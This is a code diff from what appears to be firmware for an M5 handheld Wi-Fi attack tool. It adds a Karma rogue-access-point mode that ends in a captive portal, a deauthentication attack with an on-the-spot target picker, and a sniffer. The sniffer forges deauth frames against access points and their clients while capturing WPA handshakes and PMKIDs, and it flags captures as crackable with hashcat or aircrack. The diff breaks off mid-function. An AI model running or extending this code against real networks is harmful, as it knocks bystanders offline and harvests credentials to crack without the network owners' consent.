+        M5.Display.setCursor(5, 10); M5.Display.print("Add target SSID, then Enter:"); M5.Display.display();
+        String ns = getUserInput(false, false); ns.trim();
+        if (ns.length() > 0 && ns.length() <= 32 && spearN < SPEAR_MAX) {
+          strncpy(spearList[spearN], ns.c_str(), 32); spearList[spearN][32] = 0; sel = spearN; spearN++;
+          File wf = SD.open("/evil/KarmaList.txt", FILE_APPEND);   // persist to the KarmaList file
+          if (wf) { wf.println(ns); wf.close(); }
+        }
+        spCacheReset();
+      }
+    }
+
+    char b[48];
+    snprintf(b, sizeof(b), "KARMA SPEAR  %s  targets:%d", autoMode ? "[AUTO]" : "[PAUSE]", spearN);
+    spDrawLine(0, 2, autoMode ? TFT_GREEN : TFT_YELLOW, b);
+    spDrawLine(1, 15, TFT_DARKGREY, "from /evil/KarmaList.txt");
+    if (top > sel) top = sel;
+    if (sel >= top + rows) top = sel - rows + 1;
+    for (int r = 0; r < rows; r++) {
+      int li = top + r;
+      if (li < spearN) { bool cur = (li == sel); snprintf(b, sizeof(b), "%c%.34s", cur ? '>' : ' ', spearList[li]);
+        spDrawLine(2 + r, 28 + r * 12, cur ? TFT_WHITE : TFT_LIGHTGREY, b); }
+      else spDrawLine(2 + r, 28 + r * 12, TFT_BLACK, "");
+    }
+    spDrawLine(10, 125, TFT_CYAN, ",/. pick  ENTER go  a add  p auto  DEL exit");
+    delay(50);
+  }
+
+  esp_wifi_set_promiscuous(false);
   isAutoKarmaActive = false;
-  Serial.println(F("Karma Spear Failed..."));
-  waitAndReturnToMenu("Karma Spear Failed...");
+  if (karmaSuccess) createCaptivePortal();   // serve the full portal on the winning SSID
+  inMenu = true;
+  drawMenu();
 }
 
 
@@ -11829,6 +12533,24 @@ void updateMacAddresses(const uint8_t* bssid) {
 
 int deauthCount = 0;
 
+// Fresh scan + network picker shown at Deauther launch so the user chooses the
+// target on the spot instead of relying on a prior "Select Network". Returns the
+// chosen scan index, or -1 if cancelled / nothing found.
+int pickNetworkForDeauth() {
+    M5.Display.clear();
+    M5.Display.setTextColor(TFT_WHITE);
+    M5.Display.setCursor(12, M5.Display.height() / 2);
+    M5.Display.print("Scanning networks...");
+    M5.Display.display();
+    WiFi.mode(WIFI_STA);
+    WiFi.disconnect();
+    int n = WiFi.scanNetworks();
+    storeScanResults(n);
+    if (numSsid <= 0) { waitAndReturnToMenu("No networks found"); return -1; }
+    inMenu = false;
+    return showWifiList(true);
+}
+
 void deauthAttack(int networkIndex) {
     if (!SD.exists("/evil/handshakes")) {
         if (SD.mkdir("/evil/handshakes")) {
@@ -12044,556 +12766,552 @@ void snifferCallbackDeauth(void* buf, wifi_promiscuous_pkt_type_t type) {
 
 /*
 ============================================================================================================================
-Sniff and deauth clients
+Sniff and deauth clients  (v3: fixed-array model, portMUX-guarded, targeted UX,
+non-blocking deauth, deferred SD writes, flicker-free line-cached UI). Only shows
+APs that actually have clients; can target one AP, one client, or every client of
+every AP at once. EAPOL/handshakes are captured to PCAP while deauthing.
 ============================================================================================================================
-*/ 
-bool macFromString(const std::string& macStr, uint8_t* macArray) {
-  int values[6];  // Temporary array to store the parsed values
-  if (sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x",
-             &values[0], &values[1], &values[2], &values[3], &values[4], &values[5]) == 6) {
-    // Convert to uint8_t
-    for (int i = 0; i < 6; ++i) {
-      macArray[i] = static_cast<uint8_t>(values[i]);
-    }
-    return true;
-  }
-  return false;
+*/
+#define DC_MAX_AP   24
+#define DC_MAX_CLI  16
+#define DC_CAPQ     6
+#define DC_CAP_BUF  (sizeof(wifi_pkt_rx_ctrl_t) + 320)
+
+struct DcClient { uint8_t mac[6]; int8_t rssi; uint32_t last; uint8_t eapol; bool pmkid; };
+// eapol: bit0=M1 bit1=M2 bit2=M3 bit3=M4 of the WPA 4-way handshake.
+struct DcAp {
+  uint8_t  bssid[6];
+  char     ssid[20];
+  uint8_t  channel;
+  int8_t   rssi;
+  uint32_t last;
+  uint8_t  nCli;
+  DcClient cli[DC_MAX_CLI];
+};
+
+static DcAp*             dcAps = nullptr;   // heap-allocated only while the mode runs
+static volatile uint8_t  dcNAp = 0;
+static portMUX_TYPE      dcMux = portMUX_INITIALIZER_UNLOCKED;
+static volatile uint32_t dcPkts = 0;
+static volatile uint32_t dcDwellPkts = 0;   // packets seen on the current channel (adaptive DEEP dwell)
+static volatile uint32_t dcEapolCnt = 0;
+static volatile bool     dcCaptureOn = false;
+static volatile uint8_t  dcLastEapolAp[6] = {0};   // BSSID of the most recent captured handshake
+static volatile bool     dcLastEapolSet = false;
+
+// Deferred capture ring (SPSC: producer = WiFi callback, consumer = UI loop).
+struct DcCap { uint16_t total; bool beacon; uint8_t raw[DC_CAP_BUF]; };
+static DcCap*            dcCapQ = nullptr;   // heap-allocated only while the mode runs
+static volatile uint8_t  dcCapHead = 0, dcCapTail = 0;
+
+// Per-line render cache: a line is only cleared+redrawn when its text/color
+// changes, so the screen never gets a full-frame clear (that was the flicker).
+static char (*dcCache)[48] = nullptr;   // heap-allocated only while the mode runs
+
+// Forward decls: keep arduino-cli's auto-prototype generator from emitting
+// illegal `static extern "C"` prototypes for these static functions.
+static int  dcFindAp(const uint8_t* bssid);
+static const char* dcVendor(const uint8_t* mac);
+static void dcTxDeauth(const uint8_t* dst, const uint8_t* src, const uint8_t* bssid);
+static void dcEnqueueCap(const wifi_promiscuous_pkt_t* pkt, uint16_t len, bool beacon);
+static void dcCb(void* buf, wifi_promiscuous_pkt_type_t type);
+static void dcDrawLine(int slot, int y, uint16_t fg, const char* txt);
+static void dcCacheReset();
+static void dcApHs(const DcAp& A, uint8_t* msgs, bool* pmkid, bool* crack);
+static void dcEapolLine(char* out, int sz, const DcAp* snap, int snapN, bool* crackOut);
+
+struct DcOui { uint8_t p[3]; const char* v; };
+static const DcOui DC_OUI[] = {
+  {{0xA4,0x83,0xE7},"Apple"},{{0xF0,0x18,0x98},"Apple"},{{0xDC,0x2B,0x2A},"Apple"},
+  {{0x04,0x0C,0xCE},"Apple"},{{0x3C,0x07,0x54},"Apple"},
+  {{0x5C,0x0A,0x5B},"Samsung"},{{0x34,0x23,0x87},"Samsung"},{{0xC8,0x19,0xF7},"Samsung"},
+  {{0x3C,0x5A,0xB4},"Google"},{{0xDA,0xA1,0x19},"Google"},{{0x1C,0x53,0xF9},"Google"},
+  {{0x3C,0xA9,0xF4},"Intel"},{{0x7C,0x7A,0x91},"Intel"},{{0xA0,0xA8,0xCD},"Intel"},
+  {{0x24,0x0A,0xC4},"Espressif"},{{0x30,0xAE,0xA4},"Espressif"},{{0xA4,0xCF,0x12},"Espressif"},
+  {{0xB8,0x27,0xEB},"RaspPi"},{{0xDC,0xA6,0x32},"RaspPi"},
+  {{0x44,0x65,0x0D},"Amazon"},{{0xFC,0xA1,0x83},"Amazon"},
+  {{0x64,0x09,0x80},"Xiaomi"},{{0x9C,0x28,0xEF},"Huawei"},{{0x50,0xC7,0xBF},"TP-Link"},
+};
+static const int DC_OUI_N = sizeof(DC_OUI) / sizeof(DC_OUI[0]);
+
+static const char* dcVendor(const uint8_t* mac) {
+  if (mac[0] & 0x02) return "rand";
+  for (int i = 0; i < DC_OUI_N; i++)
+    if (DC_OUI[i].p[0]==mac[0] && DC_OUI[i].p[1]==mac[1] && DC_OUI[i].p[2]==mac[2])
+      return DC_OUI[i].v;
+  return "?";
 }
 
-
-void broadcastDeauthAttack(const uint8_t* ap_mac, int channel) {
-  // Set the channel to the AP's channel
-  esp_err_t ret = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
-  if (ret != ESP_OK) {
-    printf("Erreur lors du changement de canal: %s\n", esp_err_to_name(ret));
-    return;
-  }
-  M5.Lcd.setCursor(67, 1);
-  M5.Lcd.printf("C:");
-  M5.Lcd.print(channel);
-  M5.Lcd.print(" ");
-
-  // Set AP and source MAC addresses
-  updateMacAddresses(ap_mac);
-
-  // Set the receiver MAC to broadcast
-  memset(receiver_mac, 0xFF, 6);  // Broadcast MAC address
-
-  Serial.println(F("-----------------------------"));
-  Serial.print(F("Deauth for AP MAC: "));
-  Serial.println(mac_to_string(ap_mac).c_str());
-  Serial.print(F("On Channel: "));
-  Serial.println(channel);
-
-
-  // Send 10 deauthentication packets
-  for (int i = 0; i < nbDeauthSend; i++) {
-    sendDeauthPacket();
-  }
+static int dcFindAp(const uint8_t* bssid) {
+  for (int i = 0; i < dcNAp; i++)
+    if (memcmp(dcAps[i].bssid, bssid, 6) == 0) return i;
+  return -1;
 }
 
-void sendDeauthToClient(const uint8_t* client_mac, const uint8_t* ap_mac, int channel) {
-  esp_err_t ret = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
-  if (ret != ESP_OK) {
-    printf("Erreur lors du changement de canal: %s\n", esp_err_to_name(ret));
-    return;
-  }
-  M5.Lcd.setCursor(67, 1);
-  M5.Lcd.printf("C:");
-  M5.Lcd.print(channel);
-  M5.Lcd.print(" ");
-
-  uint8_t frame[26];
-  memcpy(frame, deauth_frame, 26);  // copie depuis la frame globale
-
-  // Modifier les adresses MAC dans la trame de déauthentification
-  memcpy(frame + 4, ap_mac, 6);       // Adresse MAC de l'AP (destinataire)
-  memcpy(frame + 10, client_mac, 6);  // Source MAC client
-  memcpy(frame + 16, ap_mac, 6);      // BSSID (AP)
-
-  // Envoyer la trame modifiée
-  esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
-  /*
-    //Debugging output of packet contents
-    Serial.println(F("Deauthentication Frame Sent:"));
-    for (int i = 0; i < sizeof(deauth_frame); i++) {
-      Serial.print(deauth_frame[i], HEX);
-      Serial.print(F(" "));
-    }
-    Serial.println();*/
+static void dcTxDeauth(const uint8_t* dst, const uint8_t* src, const uint8_t* bssid) {
+  uint8_t fr[26];
+  memcpy(fr, deauth_frame, 26);
+  memcpy(fr + 4,  dst,   6);
+  memcpy(fr + 10, src,   6);
+  memcpy(fr + 16, bssid, 6);
+  esp_wifi_80211_tx(WIFI_IF_STA, fr, sizeof(fr), false);
 }
 
-void sendBroadcastDeauths() {
-  for (auto& ap : connections) {
-    if (!ap.second.empty() && isRegularAP(ap.first)) {
-      if (ap_names.find(ap.first) != ap_names.end() && !ap_names[ap.first].empty()) {
-        esp_task_wdt_reset();  // S'assurer que le watchdog est réinitialisé fréquemment
-        vTaskDelay(pdMS_TO_TICKS(10));  // Pause pour éviter de surcharger le CPU
-        Serial.println(F("-----------------------------"));
-        Serial.print(F("Sending Broadcast Deauth to AP: "));
-        Serial.println(ap_names[ap.first].c_str());
+static void dcEnqueueCap(const wifi_promiscuous_pkt_t* pkt, uint16_t len, bool beacon) {
+  uint8_t next = (dcCapHead + 1) % DC_CAPQ;
+  if (next == dcCapTail) return;
+  DcCap& c = dcCapQ[dcCapHead];
+  uint16_t total = sizeof(wifi_pkt_rx_ctrl_t) + len;
+  if (total > DC_CAP_BUF) total = DC_CAP_BUF;
+  memcpy(c.raw, pkt, total);
+  if (beacon) ((wifi_promiscuous_pkt_t*)c.raw)->rx_ctrl.sig_len -= 4;
+  c.total = total; c.beacon = beacon;
+  dcCapHead = next;
+}
 
-        M5.Lcd.setCursor(M5.Display.width() / 2 - 80 , M5.Display.height() / 2 + 28);
-        M5.Lcd.printf(ap_names[ap.first].c_str());
+static void dcCb(void* buf, wifi_promiscuous_pkt_type_t type) {
+  if (!dcAps) return;                                       // mode not active / buffer freed
+  if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
+  const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
+  const uint8_t* f = pkt->payload;
+  uint16_t len = pkt->rx_ctrl.sig_len;
+  if (len < 24) return;
+  int8_t  rssi = pkt->rx_ctrl.rssi;
+  uint8_t ch   = pkt->rx_ctrl.channel;
+  uint16_t fc  = (uint16_t)f[0] | ((uint16_t)f[1] << 8);
+  uint8_t ftype = (fc & 0x0C) >> 2;
+  uint8_t fsub  = (fc & 0xF0) >> 4;
+  dcPkts++; dcDwellPkts++;
 
-        int channel = ap_channels_map[ap.first];
-        uint8_t ap_mac_address[6];
-        if (macFromString(ap.first, ap_mac_address)) {
-          broadcastDeauthAttack(ap_mac_address, channel);
-          // Après l'attaque de broadcast, envoyer une trame à chaque client
-          for (const auto& client : ap.second) {
-            uint8_t client_mac[6];
-            if (macFromString(client, client_mac)) {
-              Serial.println(F("-----------------------------"));
-              Serial.print(F("Sending Deauth from client MAC "));
-              Serial.print(mac_to_string(client_mac).c_str());
-              Serial.print(F(" to AP MAC "));
-              Serial.println(mac_to_string(ap_mac_address).c_str());
-
-              M5.Lcd.setCursor(M5.Display.width() / 2 - 83 , M5.Display.height() / 2 + 16);
-              M5.Lcd.printf("Sending Deauth to");
-
-              for (int i = 0; i < nbDeauthSend; i++) {
-                sendDeauthToClient(client_mac, ap_mac_address, channel);
-              }
-            }
+  if (len >= 34 && estUnPaquetEAPOL(pkt)) {
+    dcEapolCnt++; dcEnqueueCap(pkt, len, false);
+    // Classify the 4-way message from the EAPOL-Key Information field and look
+    // for a PMKID KDE, so we can tell the user whether what's on disk is enough
+    // to actually crack (hashcat 22000 / aircrack): PMKID, or M2 + (M1 or M3).
+    uint16_t llc  = (ftype == 0x02 && (fsub & 0x08)) ? 26 : 24;   // +2 for QoS data
+    uint16_t body = llc + 12;                                     // LLC/SNAP(8) + EAPOL hdr(4)
+    uint8_t  msg = 0; bool pmkid = false;
+    if ((uint32_t)body + 95 <= len) {
+      uint16_t ki  = ((uint16_t)f[body + 1] << 8) | f[body + 2];
+      bool mic = ki & 0x0100, ack = ki & 0x0080, inst = ki & 0x0040, sec = ki & 0x0200;
+      if      ( ack && !mic)                 msg = 1;
+      else if (!ack &&  mic && !sec)         msg = 2;
+      else if ( ack &&  mic && (inst || sec))msg = 3;
+      else if (!ack &&  mic &&  sec)         msg = 4;
+      uint16_t kdl = ((uint16_t)f[body + 93] << 8) | f[body + 94];
+      if (msg == 1 && kdl >= 22 && (uint32_t)body + 95 + kdl <= len) {
+        const uint8_t* kd = f + body + 95;
+        for (uint16_t q = 0; q + 2 <= kdl; ) {
+          uint8_t did = kd[q], dlen = kd[q + 1];
+          if ((uint16_t)(q + 2 + dlen) > kdl) break;
+          if (did == 0xDD && dlen >= 20 && kd[q+2]==0x00 && kd[q+3]==0x0F && kd[q+4]==0xAC && kd[q+5]==0x04) {
+            for (int z = 0; z < 16; z++) if (kd[q + 6 + z]) { pmkid = true; break; }
           }
-          // Attente non-bloquante pour capturer EAPOL
-          {
-            unsigned long waitStart = millis();
-            while (millis() - waitStart < deauthWaitingTime) {
-              esp_task_wdt_reset();
-              vTaskDelay(pdMS_TO_TICKS(50));
-            }
-          }
-          M5.Lcd.setCursor(M5.Display.width() / 2 - 80, M5.Display.height() / 2 + 28);
-          M5.Lcd.printf("                                ");
-        } else {
-          Serial.println(F("Failed to convert AP MAC address from string."));
-        }
-        M5.Lcd.setCursor(M5.Display.width() / 2 - 83  , M5.Display.height() / 2 + 16);
-        M5.Lcd.printf("                       ");
-      }
-    }
-  }
-}
-
-std::string mac_to_string(const uint8_t* mac) {
-  char buf[18];
-  sprintf(buf, "%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
-  return std::string(buf);
-}
-
-void changeChannel() {
-  static auto it = ap_channels.begin(); // Initialisation de l'iterator
-
-  // Vérification de l'existence de canaux
-  if (ap_channels.empty()) {
-    Serial.println(F("Aucun canal valide n'est disponible."));
-    return;
-  }
-
-  if (it == ap_channels.end()) {
-    it = ap_channels.begin();  // Réinitialiser l'iterator si nécessaire
-  }
-
-  int newChannel = *it;  // Récupérer le canal courant
-
-  // Vérification de la validité du canal
-  if (newChannel < 1 || newChannel > 13) {
-    Serial.println(F("Canal invalide détecté. Réinitialisation au premier canal valide."));
-    Serial.println(newChannel);
-    Serial.println(*it);
-    it = ap_channels.begin();  // Réinitialiser l'iterator
-    newChannel = *it;  // Récupérer un canal valide
-  }
-
-  // Tentative de changement du canal Wi-Fi
-  esp_err_t ret = esp_wifi_set_channel(newChannel, WIFI_SECOND_CHAN_NONE);
-  if (ret != ESP_OK) {
-    Serial.printf("Erreur lors du changement de canal: %s\n", esp_err_to_name(ret));
-    return;
-  }
-
-  // Mise à jour du canal actuel et avancement de l'iterator
-  currentChannel = newChannel;
-  it++;
-
-  // Affichage de la confirmation du changement
-  Serial.print(F("Switching channel on  "));
-  Serial.println(currentChannel);
-  Serial.println(F("-----------------------------"));
-
-  // Mise à jour de l'affichage sur l'appareil M5
-  M5.Lcd.setCursor(67, 1);
-  M5.Lcd.printf("C:%d ", currentChannel);
-}
-
-
-void wifi_scan() {
-  Serial.println(F("-----------------------------"));
-  Serial.println(F("Scanning WiFi networks..."));
-  ap_channels.clear();
-  const char* scanningText = "Scanning nearby networks..";
-  M5.Lcd.setCursor((M5.Lcd.width()-M5.Lcd.textWidth(scanningText))/2, M5.Display.height() - 12 );
-  M5.Lcd.printf(scanningText);
-
-  int n = WiFi.scanNetworks(false, false);
-  if (n == 0) {
-    Serial.println(F("No networks found"));
-    const char* failedText = "No AP Found.";
-    M5.Lcd.setCursor((M5.Lcd.width()-M5.Lcd.textWidth(failedText))/2, M5.Display.height() - 12 );
-    M5.Lcd.setTextColor(TFT_RED);
-    M5.Lcd.printf(failedText);
-    return;
-  }
-
-  Serial.print(F("Found "));
-  Serial.print(n);
-  Serial.println(F(" networks"));
-
-  for (int i = 0; i < n; ++i) {
-    String ssid = WiFi.SSID(i);
-    int32_t rssi = WiFi.RSSI(i);
-    uint8_t *bssid = WiFi.BSSID(i);
-    int32_t channel = WiFi.channel(i);
-
-    std::string bssidString = mac_to_string(bssid);
-    ap_names[bssidString] = ssid.c_str();
-    ap_channels.insert(channel);
-    ap_channels_map[bssidString] = channel;
-
-    // Convert std::string to const char* for Serial.print
-    Serial.print(bssidString.c_str());
-    Serial.print(F(" | "));
-    Serial.print(ssid);
-    Serial.print(F(" | Channel: "));
-    Serial.println(channel);
-  }
-
-  Serial.println(F("-----------------------------"));
-  M5.Lcd.setCursor(0, 1);
-  M5.Lcd.printf("AP:");
-  M5.Lcd.print(n);
-  M5.Lcd.print("  ");
-  M5.Lcd.drawLine(0, 13, M5.Lcd.width(), 13, taskbarDividerColor);
-  delay(30);
-  M5.Lcd.setCursor((M5.Lcd.width()-M5.Lcd.textWidth(scanningText))/2, M5.Display.height() - 12 );
-  M5.Lcd.printf("                          ");
-}
-
-
-
-bool startsWithIgnoreCase(const char* s, const char* prefix) {
-  while (*prefix) {
-    if (!*s) return false;
-    if (tolower(static_cast<unsigned char>(*s)) != tolower(static_cast<unsigned char>(*prefix))) {
-      return false;
-    }
-    ++s;
-    ++prefix;
-  }
-  return true;
-}
-
-bool isRegularAP(const std::string& mac) {
-  const char* m = mac.c_str();
-  if (startsWithIgnoreCase(m, "01:00:5e")) return false;
-  if (startsWithIgnoreCase(m, "33:33")) return false;
-  if (startsWithIgnoreCase(m, "ff:ff:ff")) return false;
-  if (startsWithIgnoreCase(m, "01:80:c2")) return false;
-  return true;
-}
-void print_connections() {
-  int yPos = 15;  // Initial Y position for text on the screen
-
-  for (auto& ap : connections) {
-    if (isRegularAP(ap.first)) {
-      if (ap_names.find(ap.first) != ap_names.end() && !ap_names[ap.first].empty()) {
-        // Clear the line before printing new data
-        M5.Lcd.fillRect(0, yPos, M5.Lcd.width(), 20, BLACK);
-
-        // Print to Serial
-        Serial.print(ap_names[ap.first].c_str());
-        Serial.print(F(" ("));
-        Serial.print(ap.first.c_str());
-        Serial.print(F(") on channel "));
-        Serial.print(ap_channels_map[ap.first]);
-        Serial.print(F(" has "));
-        Serial.print(ap.second.size());
-        Serial.println(F(" clients:"));
-        for (auto& client : ap.second) {
-          Serial.print(F(" - "));
-          Serial.println(client.c_str());
-        }
-        // Print to screen
-        String currentAPName = String(ap_names[ap.first].c_str());
-        int clientCount = ap.second.size();
-        String displayText = currentAPName + ": " + String(clientCount);
-
-        M5.Lcd.setCursor(0, yPos);
-        M5.Lcd.println(displayText);
-
-        yPos += 12;  // Move the Y position for the next line
-
-        // Ensure there is enough screen space for the next line
-        if (yPos > M5.Lcd.height() - 15) {
-          break;  // Exit the loop if there's not enough space for more lines
+          q += 2 + dlen;
         }
       }
     }
-  }
-  Serial.println(F("-----------------------------"));
-}
-
-
-void promiscuous_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
-  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
-  wifi_pkt_rx_ctrl_t ctrl = pkt->rx_ctrl;
-  const uint8_t *frame = pkt->payload;
-  const uint16_t frameControl = (uint16_t)frame[0] | ((uint16_t)frame[1] << 8);
-  const uint8_t frameType = (frameControl & 0x0C) >> 2;
-  const uint8_t frameSubType = (frameControl & 0xF0) >> 4;
-
-  const uint8_t *bssid = frame + 16; // BSSID position for management frames
-  std::string bssidStr = mac_to_string(bssid);
-
-  if (estUnPaquetEAPOL(pkt)) {
-    Serial.println(F("-----------------------------"));
-    Serial.println(F("EAPOL Detected !!!!!!!!!!!!!!!"));
-    // Extract the BSSID from the packet, typically found at Address 3 in most WiFi frames
-    const uint8_t *bssid = frame + 16;
-
-    // Convert the BSSID to string format
-    std::string bssidStr = mac_to_string(bssid);
-
-    // Look up the AP name using the BSSID
-    std::string apName = ap_names[bssidStr];
-
-    // Print the AP name to the serial output
-    Serial.print(F("EAPOL Detected from AP: "));
-    if (!apName.empty()) {
-      Serial.println(apName.c_str());
-      M5.Lcd.setCursor(0 , M5.Display.height() - 10);
-      String eapolapname = apName.c_str();
-      M5.Lcd.print("EAPOL!:" + eapolapname + "                         ");
-    } else {
-      Serial.println(F("Unknown AP"));
-      M5.Lcd.setCursor(0 , M5.Display.height() - 8);
-      M5.Lcd.printf("EAPOL from Unknow                                 ");
+    const uint8_t* bssid  = f + 16;                               // addr3 = BSSID
+    const uint8_t* client = (memcmp(f + 4, bssid, 6) == 0) ? (f + 10) : (f + 4);
+    portENTER_CRITICAL(&dcMux);
+    for (int i = 0; i < 6; i++) ((uint8_t*)dcLastEapolAp)[i] = bssid[i];
+    dcLastEapolSet = true;
+    int ai = dcFindAp(bssid);
+    if (ai >= 0 && !(client[0] & 0x01)) {
+      DcAp& A = dcAps[ai];
+      int ci = -1;
+      for (int i = 0; i < A.nCli; i++) if (memcmp(A.cli[i].mac, client, 6) == 0) { ci = i; break; }
+      if (ci < 0 && A.nCli < DC_MAX_CLI) { ci = A.nCli++; memset(&A.cli[ci], 0, sizeof(DcClient)); memcpy(A.cli[ci].mac, client, 6); }
+      if (ci >= 0) { if (msg) A.cli[ci].eapol |= (1 << (msg - 1)); if (pmkid) A.cli[ci].pmkid = true; A.cli[ci].last = millis(); }
     }
-    Serial.println(F("-----------------------------"));
+    portEXIT_CRITICAL(&dcMux);
+  }
 
-
-    enregistrerDansFichierPCAP(pkt, false);
-    nombreDeEAPOL++;
-    M5.Lcd.setCursor(116, 1);
-    M5.Lcd.printf("H:");
-    M5.Lcd.print(nombreDeHandshakes);
-    if (nombreDeEAPOL < 99) {
-      M5.Lcd.setCursor(164, 1);
-    } else {
-      M5.Lcd.setCursor(155, 1);
+  if (ftype == 0x00 && (fsub == 0x08 || fsub == 0x05)) {       // beacon / probe-resp = AP
+    const uint8_t* bssid = f + 16;
+    if (bssid[0] & 0x01) return;
+    // Walk the tagged parameters (start at offset 36, after the 24-byte header
+    // and 12-byte fixed params) for the SSID (tag 0) and, crucially, the real
+    // operating channel from the DS Parameter Set (tag 3). rx_ctrl.channel is
+    // only the channel WE were tuned to, so during hopping a neighbour-channel
+    // catch mislabels an AP (ch11 showing up as 10/11/12).
+    uint8_t realCh = 0;
+    char    ssid[20]; ssid[0] = 0; bool haveSsid = false;
+    for (uint16_t p = 36; p + 2 <= len; ) {
+      uint8_t tid = f[p], tlen = f[p + 1];
+      if ((uint16_t)(p + 2 + tlen) > len) break;
+      if (tid == 0) { uint8_t n = tlen > 19 ? 19 : tlen; if (n) memcpy(ssid, f + p + 2, n); ssid[n] = 0; haveSsid = true; }
+      else if (tid == 3 && tlen >= 1) realCh = f[p + 2];
+      p += 2 + tlen;
     }
-    M5.Lcd.printf("E:");
-    M5.Lcd.print(nombreDeEAPOL);
-    esp_task_wdt_reset();  // Réinitialisation du watchdog
-    // Délay pour permettre au task IDLE de s'exécuter
-    vTaskDelay(pdMS_TO_TICKS(10));
+    if (realCh < 1 || realCh > 14) realCh = ch;                // fallback: rx channel
+    portENTER_CRITICAL(&dcMux);
+    int idx = dcFindAp(bssid);
+    if (idx < 0 && dcNAp < DC_MAX_AP) { idx = dcNAp++; memset(&dcAps[idx], 0, sizeof(DcAp)); memcpy(dcAps[idx].bssid, bssid, 6); }
+    if (idx >= 0) {
+      dcAps[idx].channel = realCh; dcAps[idx].rssi = rssi; dcAps[idx].last = millis();
+      if (haveSsid && ssid[0]) { strncpy(dcAps[idx].ssid, ssid, 19); dcAps[idx].ssid[19] = 0; }
+      else if (dcAps[idx].ssid[0] == 0) strcpy(dcAps[idx].ssid, "<hidden>");
+    }
+    portEXIT_CRITICAL(&dcMux);
+    if (dcCaptureOn) dcEnqueueCap(pkt, len, true);
+    return;
   }
 
-  if (frameType == 0x00 && frameSubType == 0x08) {
-    const uint8_t *senderAddr = frame + 10; // Adresse source dans la trame beacon
+  if (ftype != 0x02) return;                                   // data frames only
+  bool toDS = f[1] & 0x01, fromDS = f[1] & 0x02;
+  const uint8_t *ap, *cli;
+  if (toDS && !fromDS)      { ap = f + 4;  cli = f + 10; }
+  else if (!toDS && fromDS) { ap = f + 10; cli = f + 4;  }
+  else return;
+  if ((cli[0] & 0x01) || (ap[0] & 0x01) || memcmp(ap, cli, 6) == 0) return;
 
-    // Convertir l'adresse MAC en chaîne de caractères pour la comparaison
-    char macStr[18];
-    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
-             senderAddr[0], senderAddr[1], senderAddr[2], senderAddr[3], senderAddr[4], senderAddr[5]);
-
-
-    pkt->rx_ctrl.sig_len -= 4;  // Réduire la longueur du signal de 4 bytes
-    esp_task_wdt_reset();  // Réinitialisation du watchdog
-    vTaskDelay(pdMS_TO_TICKS(10));
-    enregistrerDansFichierPCAP(pkt, true);  // Enregistrer le paquet
+  portENTER_CRITICAL(&dcMux);
+  int aidx = dcFindAp(ap);
+  if (aidx >= 0) {
+    DcAp& A = dcAps[aidx];
+    A.last = millis();
+    int c = -1;
+    for (int i = 0; i < A.nCli; i++) if (memcmp(A.cli[i].mac, cli, 6) == 0) { c = i; break; }
+    if (c < 0 && A.nCli < DC_MAX_CLI) { c = A.nCli++; memcpy(A.cli[c].mac, cli, 6); }
+    if (c >= 0) { A.cli[c].rssi = rssi; A.cli[c].last = millis(); }
   }
-
-  if (frameType != 2) return;
-
-  const uint8_t *mac_ap = frame + 4;
-  const uint8_t *mac_client = frame + 10;
-  std::string ap_mac = mac_to_string(mac_ap);
-  std::string client_mac = mac_to_string(mac_client);
-
-  if (!isRegularAP(ap_mac) || ap_mac == client_mac) return;
-
-  if (connections.find(ap_mac) == connections.end()) {
-    connections[ap_mac] = std::vector<std::string>();
-  }
-  if (std::find(connections[ap_mac].begin(), connections[ap_mac].end(), client_mac) == connections[ap_mac].end()) {
-    connections[ap_mac].push_back(client_mac);
-  }
+  portEXIT_CRITICAL(&dcMux);
 }
 
-
-void purgeAllAPData() {
-  connections.clear();  // Clears all client associations
-  M5.Lcd.fillRect(0, 14, M5.Lcd.width(), M5.Lcd.height() - 14, BLACK);
-  Serial.println(F("All AP and client data have been purged."));
+static void dcCacheReset() {
+  if (dcCache) memset(dcCache, 0, 12 * 48);   // pointer now: size is explicit, not sizeof
+  M5.Display.fillRect(0, 0, 240, 135, TFT_BLACK);
 }
 
+static void dcDrawLine(int slot, int y, uint16_t fg, const char* txt) {
+  char key[48];
+  snprintf(key, sizeof(key), "%04X|%s", (unsigned)fg, txt);
+  if (strncmp(dcCache[slot], key, sizeof(dcCache[slot])) == 0) return;
+  strncpy(dcCache[slot], key, sizeof(dcCache[slot]) - 1);
+  dcCache[slot][sizeof(dcCache[slot]) - 1] = 0;
+  M5.Display.fillRect(0, y, 240, 12, TFT_BLACK);
+  M5.Display.setTextFont(1); M5.Display.setTextSize(1);
+  M5.Display.setTextColor(fg, TFT_BLACK);
+  M5.Display.setCursor(2, y);
+  M5.Display.print(txt);
+}
+
+// Aggregate an AP's handshake state over its clients. crack = this AP has at
+// least one client whose captured frames are enough to crack: a PMKID, or
+// M2 together with M1 or M3 (a valid pair for hashcat 22000 / aircrack-ng).
+static void dcApHs(const DcAp& A, uint8_t* msgs, bool* pmkid, bool* crack) {
+  uint8_t m = 0; bool p = false, cr = false;
+  for (int i = 0; i < A.nCli; i++) {
+    m |= A.cli[i].eapol;
+    if (A.cli[i].pmkid) p = true;
+    uint8_t e = A.cli[i].eapol;
+    if (A.cli[i].pmkid || ((e & 0x02) && ((e & 0x01) || (e & 0x04)))) cr = true;
+  }
+  *msgs = m; *pmkid = p; *crack = cr;
+}
+
+// Status line: "EAPOL:<n> <ssid> M12+P OK" for the last handshake seen. Sets
+// *crackOut so the caller can colour it green when the capture is crackable.
+static void dcEapolLine(char* out, int sz, const DcAp* snap, int snapN, bool* crackOut) {
+  *crackOut = false;
+  if (!dcLastEapolSet) { snprintf(out, sz, "EAPOL:%lu  (no handshake yet)", (unsigned long)dcEapolCnt); return; }
+  uint8_t la[6];
+  portENTER_CRITICAL(&dcMux);
+  for (int i = 0; i < 6; i++) la[i] = ((uint8_t*)dcLastEapolAp)[i];
+  portEXIT_CRITICAL(&dcMux);
+  int fi = -1;
